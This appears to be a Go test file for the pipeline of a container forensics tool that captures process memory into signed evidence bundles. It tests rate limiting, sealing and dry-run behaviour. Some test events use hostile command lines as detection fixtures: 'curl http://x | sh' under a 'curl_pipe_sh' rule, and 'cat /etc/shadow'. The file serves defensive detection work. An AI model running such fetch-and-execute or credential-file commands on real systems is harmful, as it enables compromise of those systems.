package pipeline

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/rs/zerolog"

	"github.com/Unspekable1654/flight-recorder/pkg/capture"
	"github.com/Unspekable1654/flight-recorder/pkg/config"
	"github.com/Unspekable1654/flight-recorder/pkg/container"
	"github.com/Unspekable1654/flight-recorder/pkg/evidence"
	"github.com/Unspekable1654/flight-recorder/pkg/export"
	"github.com/Unspekable1654/flight-recorder/pkg/probe"
	"github.com/Unspekable1654/flight-recorder/pkg/seal"
)

// -----------------------------------------------------------------------------
// Rate limiting
// -----------------------------------------------------------------------------

func TestRateLimiterGlobalCap(t *testing.T) {
	limiter := NewRateLimiter(3, 0)

	for i := 0; i < 3; i++ {
		if ok, reason := limiter.Allow("container-a"); !ok {
			t.Fatalf("capture %d rejected: %s", i, reason)
		}
	}
	ok, reason := limiter.Allow("container-b")
	if ok {
		t.Fatal("the fourth capture was allowed past a limit of 3")
	}
	if !strings.Contains(reason, "global") {
		t.Errorf("reason = %q, want it to name the global limit", reason)
	}
}

func TestRateLimiterPerContainerCap(t *testing.T) {
	limiter := NewRateLimiter(100, 2)

	for i := 0; i < 2; i++ {
		if ok, _ := limiter.Allow("noisy"); !ok {
			t.Fatalf("capture %d for the noisy container was rejected", i)
		}
	}
	if ok, reason := limiter.Allow("noisy"); ok {
		t.Error("the noisy container exceeded its per-container budget")
	} else if !strings.Contains(reason, "per-container") {
		t.Errorf("reason = %q", reason)
	}

	// A different container must be unaffected: one workload attacking the
	// recorder must not blind it to every other workload on the node.
	if ok, reason := limiter.Allow("quiet"); !ok {
		t.Errorf("an unrelated container was rate limited: %s", reason)
	}
}

func TestRateLimiterWindowSlides(t *testing.T) {
	limiter := NewRateLimiter(2, 0)

	now := time.Now()
	limiter.nowFunc = func() time.Time { return now }

	if ok, _ := limiter.Allow("a"); !ok {
		t.Fatal("first capture rejected")
	}
	if ok, _ := limiter.Allow("a"); !ok {
		t.Fatal("second capture rejected")
	}
	if ok, _ := limiter.Allow("a"); ok {
		t.Fatal("third capture allowed within the window")
	}

	now = now.Add(61 * time.Second)
	if ok, reason := limiter.Allow("a"); !ok {
		t.Errorf("capture rejected after the window slid: %s", reason)
	}
}

func TestRateLimiterRejectionsDoNotConsumeBudget(t *testing.T) {
	limiter := NewRateLimiter(1, 0)

	if ok, _ := limiter.Allow("a"); !ok {
		t.Fatal("first capture rejected")
	}
	for i := 0; i < 10; i++ {
		if ok, _ := limiter.Allow("a"); ok {
			t.Fatal("a capture was allowed past the limit")
		}
	}

	// After the window, exactly one more must be allowed - the ten rejections
	// must not have extended the outage.
	now := time.Now().Add(61 * time.Second)
	limiter.nowFunc = func() time.Time { return now }
	if ok, _ := limiter.Allow("a"); !ok {
		t.Error("rejections consumed budget: the limiter is stuck closed")
	}
}

func TestRateLimiterZeroMeansUnlimited(t *testing.T) {
	limiter := NewRateLimiter(0, 0)
	for i := 0; i < 1000; i++ {
		if ok, reason := limiter.Allow("a"); !ok {
			t.Fatalf("capture %d rejected with limits disabled: %s", i, reason)
		}
	}
}

func TestRateLimiterConcurrentAccess(t *testing.T) {
	limiter := NewRateLimiter(50, 5)

	var wg sync.WaitGroup
	allowed := make(chan bool, 200)

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			ok, _ := limiter.Allow(fmt.Sprintf("container-%d", i%10))
			allowed <- ok
		}(i)
	}
	wg.Wait()
	close(allowed)

	count := 0
	for ok := range allowed {
		if ok {
			count++
		}
	}
	if count > 50 {
		t.Errorf("%d captures allowed, above the global limit of 50", count)
	}
	if count == 0 {
		t.Error("no captures were allowed at all")
	}
}

func TestRateLimiterPurge(t *testing.T) {
	limiter := NewRateLimiter(100, 5)
	for i := 0; i < 10; i++ {
		limiter.Allow(fmt.Sprintf("container-%d", i))
	}

	_, keys := limiter.Counts()
	if keys != 10 {
		t.Fatalf("tracking %d containers, want 10", keys)
	}

	now := time.Now().Add(2 * time.Minute)
	limiter.nowFunc = func() time.Time { return now }
	if purged := limiter.Purge(); purged != 10 {
		t.Errorf("purged %d entries, want 10", purged)
	}
}

// -----------------------------------------------------------------------------
// Seal and store
// -----------------------------------------------------------------------------

func testDump(size int) *capture.MemoryDump {
	data := make([]byte, size)
	for i := range data {
		data[i] = byte(i % 251)
	}
	copy(data[size/2:], "PIPELINE_TEST_MARKER")

	start := time.Now().Add(-200 * time.Millisecond)
	dump := &capture.MemoryDump{
		PID:          48291,
		NamespacePID: 1,
		Comm:         "sh",
		CgroupID:     91237845,
		CaptureStart: start,
		MapsParsedAt: start.Add(time.Millisecond),
		CaptureEnd:   time.Now(),
		FullRegions:  1,
		TotalBytes:   int64(size),
		Regions: []capture.MemoryRegion{{
			StartAddr:  0x55d4f2a00000,
			EndAddr:    uintptr(0x55d4f2a00000 + size),
			Perms:      "rw-p",
			Pathname:   "[heap]",
			Data:       data,
			Status:     capture.RegionFull,
			BytesRead:  int64(size),
			BytesTotal: int64(size),
		}},
	}
	return dump
}

func TestSealAndStoreProducesVerifiableBundle(t *testing.T) {
	root := t.TempDir()

	signer, err := seal.GenerateSigner()
	if err != nil {
		t.Fatalf("GenerateSigner: %v", err)
	}
	writer, err := evidence.NewWriter(evidence.DefaultWriterOptions(root, signer))
	if err != nil {
		t.Fatalf("NewWriter: %v", err)
	}

	dump := testDump(128 * 1024)
	payload := dump.Bytes()

	result, err := SealAndStore(SealStoreInput{
		CaseID:  "aaaabbbb-cccc-dddd-eeee-ffff00001111",
		Payload: payload,
		Dump:    dump,
		Rule:    config.Rule{Name: "curl_pipe_sh", Severity: config.SeverityCritical, MITRE: "T1059.004"},
		Event: probe.Event{
			HostPID:  48291,
			Comm:     "sh",
			Filename: "/usr/bin/sh",
			Args:     []string{"/bin/sh", "-c", "curl http://x | sh"},
		},
		Info: &container.Info{
			ContainerID:  "3f2b1c0d9e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c",
			PodName:      "victim-app",
			PodNamespace: "victim",
			Runtime:      container.RuntimeContainerd,
			NamespacePID: 1,
		},
		TriggerTime:   dump.CaptureStart,
		Signer:        signer,
		Writer:        writer,
		NodeName:      "worker-3",
		Operator:      "tester",
		KernelVersion: "6.8.0-test",
		EvidenceRoot:  root,
		Encrypted:     true,
		Compression:   evidence.CompressionZstd,
	})
	if err != nil {
		t.Fatalf("SealAndStore: %v", err)
	}

	report, err := evidence.VerifyBundle(result.Written.Dir, signer.Public(), signer)
	if err != nil {
		t.Fatalf("VerifyBundle: %v", err)
	}
	if !report.OK() {
		t.Fatalf("bundle failed verification: %v", report.Errors)
	}

	// The CASE bundle must describe the same seal the receipt does.
	if !strings.Contains(string(result.CASEBundle), result.Receipt.RootHash) {
		t.Error("CASE bundle does not carry the Merkle root")
	}

	// The notification must reference the evidence, not carry it.
	if result.Notification.MerkleRoot != result.Receipt.RootHash {
		t.Error("notification and receipt disagree about the Merkle root")
	}
	if result.Notification.EvidenceURI == "" {
		t.Error("notification has no evidence URI")
	}

	// The plaintext marker must be recoverable from the stored bundle.
	got, err := evidence.ReadPayload(result.Written.Dir, signer)
	if err != nil {
		t.Fatalf("ReadPayload: %v", err)
	}
	if !bytes.Contains(got, []byte("PIPELINE_TEST_MARKER")) {
		t.Error("the acquired content did not survive the round trip")
	}

	// regions.json must locate content within the dump.
	regionsRaw, err := os.ReadFile(filepath.Join(result.Written.Dir, evidence.FileRegions))
	if err != nil {
		t.Fatalf("read regions.json: %v", err)
	}
	if !strings.Contains(string(regionsRaw), "0x55d4f2a00000") {
		t.Error("region map does not record the mapping address")
	}
}

func TestSealAndStoreRejectsEmptyPayload(t *testing.T) {
	root := t.TempDir()
	signer, err := seal.GenerateSigner()
	if err != nil {
		t.Fatalf("GenerateSigner: %v", err)
	}
	writer, err := evidence.NewWriter(evidence.DefaultWriterOptions(root, signer))
	if err != nil {
		t.Fatalf("NewWriter: %v", err)
	}

	_, err = SealAndStore(SealStoreInput{
		CaseID:  "empty",
		Payload: nil,
		Dump:    testDump(16),
		Signer:  signer,
		Writer:  writer,
	})
	if err == nil {
		t.Error("an empty payload was sealed; a bundle with no evidence is worse than no bundle")
	}
}

func TestOutcomeToStatusMapping(t *testing.T) {
	cases := map[capture.Outcome]seal.Status{
		capture.OutcomeComplete:      seal.StatusComplete,
		capture.OutcomeTruncated:     seal.StatusTruncated,
		capture.OutcomeProcessExited: seal.StatusProcessExited,
		capture.OutcomeInterrupted:   seal.StatusPartialShutdown,
		capture.OutcomePartial:       seal.StatusPartial,
	}
	for outcome, want := range cases {
		if got := outcomeToStatus(outcome); got != want {
			t.Errorf("outcomeToStatus(%q) = %q, want %q", outcome, got, want)
		}
	}
}

// -----------------------------------------------------------------------------
// Event handling
// -----------------------------------------------------------------------------

func newTestPipeline(t *testing.T, cfg *config.Config, dryRun bool) (*Pipeline, *export.Multi, string) {
	t.Helper()

	root := t.TempDir()
	signer, err := seal.GenerateSigner()
	if err != nil {
		t.Fatalf("GenerateSigner: %v", err)
	}
	writer, err := evidence.NewWriter(evidence.DefaultWriterOptions(root, signer))
	if err != nil {
		t.Fatalf("NewWriter: %v", err)
	}

	exporters := export.NewMulti()

	p, err := New(Options{
		Config:       config.NewStore(cfg),
		Signer:       signer,
		Writer:       writer,
		Exporters:    exporters,
		Logger:       zerolog.New(os.NewFile(0, os.DevNull)).Level(zerolog.Disabled),
		Workers:      2,
		QueueSize:    4,
		EvidenceRoot: root,
		ProcRoot:     t.TempDir(), // empty: no process will be resolvable
		NodeName:     "test-node",
		DryRun:       dryRun,
	})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return p, exporters, root
}

func TestPipelineIgnoresNonMatchingEvents(t *testing.T) {
	p, _, _ := newTestPipeline(t, config.Default(), true)

	ctx, cancel := context.WithCancel(context.Background())
	events := make(chan probe.Event, 4)

	done := make(chan struct{})
	go func() {
		_ = p.Run(ctx, events)
		close(done)
	}()

	events <- probe.Event{Kind: probe.KindExec, HostPID: 100, Comm: "ls", Args: []string{"/bin/ls", "-la"}}
	events <- probe.Event{Kind: probe.KindExec, HostPID: 101, Comm: "cat", Args: []string{"/bin/cat", "/etc/shadow"}}
	events <- probe.Event{Kind: probe.KindExit, HostPID: 100, Comm: "ls"}

	time.Sleep(200 * time.Millisecond)
	cancel()
	<-done

	stats := p.Stats()
	if stats.EventsSeen != 3 {
		t.Errorf("events seen = %d, want 3", stats.EventsSeen)
	}
	if stats.EventsMatched != 1 {
		t.Errorf("events matched = %d, want 1 (only the /etc/shadow read)", stats.EventsMatched)
	}
	if stats.ExitsSeen != 1 {
		t.Errorf("exits seen = %d, want 1", stats.ExitsSeen)
	}
}

func TestPipelineDryRunNeverReadsMemory(t *testing.T) {
	p, _, root := newTestPipeline(t, config.Default(), true)

	ctx, cancel := context.WithCancel(context.Background())
	events := make(chan probe.Event, 2)

	done := make(chan struct{})
	go func() {
		_ = p.Run(ctx, events)
		close(done)
	}()

	// PID 1 exists on every platform this runs on; in dry-run mode it must
	// still never be touched.
	events <- probe.Event{Kind: probe.KindExec, HostPID: 1, Comm: "cat", Args: []string{"/bin/cat", "/etc/shadow"}}

	time.Sleep(300 * time.Millisecond)
	cancel()
	<-done

	entries, err := os.ReadDir(root)
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	if len(entries) != 0 {
		t.Errorf("dry run wrote %d evidence bundles", len(entries))
	}
	if p.Stats().EventsMatched != 1 {
		t.Error("dry run did not evaluate the rule")
	}
}

func TestPipelineDropsWhenQueueFull(t *testing.T) {
	cfg := config.Default()
	p, _, _ := newTestPipeline(t, cfg, true)

	// Fill the queue without starting workers, so nothing drains it.
	for i := 0; i < cap(p.jobs); i++ {
		p.jobs <- job{event: probe.Event{HostPID: uint32(i)}, rule: config.Rule{Name: "x"}}
	}

	p.handleEvent(probe.Event{
		Kind: probe.KindExec, HostPID: 999, Comm: "cat",
		Args: []string{"/bin/cat", "/etc/shadow"},
	})

	if p.Stats().CapturesDropped != 1 {
		t.Errorf("captures dropped = %d, want 1", p.Stats().CapturesDropped)
	}
}

func TestPipelineRequiresSignerAndWriter(t *testing.T) {
	store := config.NewStore(config.Default())

	if _, err := New(Options{Config: store}); err == nil {
		t.Error("a pipeline was created without a signer")
	}

	signer, err := seal.GenerateSigner()
	if err != nil {
		t.Fatalf("GenerateSigner: %v", err)
	}
	if _, err := New(Options{Config: store, Signer: signer}); err == nil {
		t.Error("a pipeline was created without an evidence writer outside dry-run mode")
	}
	if _, err := New(Options{Config: store, Signer: signer, DryRun: true}); err != nil {
		t.Errorf("dry-run pipeline rejected: %v", err)
	}
	if _, err := New(Options{Signer: signer, DryRun: true}); err == nil {
		t.Error("a pipeline was created with no configuration store")
	}
}

func TestRegionReportOffsetsAreCumulative(t *testing.T) {
	dump := testDump(8192)
	dump.Regions = append(dump.Regions, capture.MemoryRegion{
		StartAddr:  0x7ffd3c1e0000,
		EndAddr:    0x7ffd3c1e1000,
		Perms:      "rw-p",
		Pathname:   "[stack]",
		Data:       make([]byte, 4096),
		Status:     capture.RegionFull,
		BytesRead:  4096,
		BytesTotal: 4096,
	})

	report := regionReport(dump)
	if len(report.Regions) != 2 {
		t.Fatalf("report has %d regions", len(report.Regions))
	}
	if report.Regions[0].DumpOffset != 0 {
		t.Errorf("first region offset = %d, want 0", report.Regions[0].DumpOffset)
	}
	if report.Regions[1].DumpOffset != 8192 {
		t.Errorf("second region offset = %d, want 8192", report.Regions[1].DumpOffset)
	}
	if report.Regions[1].Label != "stack" {
		t.Errorf("label = %q", report.Regions[1].Label)
	}
}

func TestSplitCmdline(t *testing.T) {
	got := splitCmdline("/bin/sh -c curl http://x | sh extra args here")
	if len(got) != 4 {
		t.Fatalf("splitCmdline returned %d fields, want the first 4: %v", len(got), got)
	}
	if got[0] != "/bin/sh" || got[1] != "-c" {
		t.Errorf("fields = %v", got)
	}
	if splitCmdline("") != nil {
		t.Error("empty cmdline should produce no fields")
	}
}
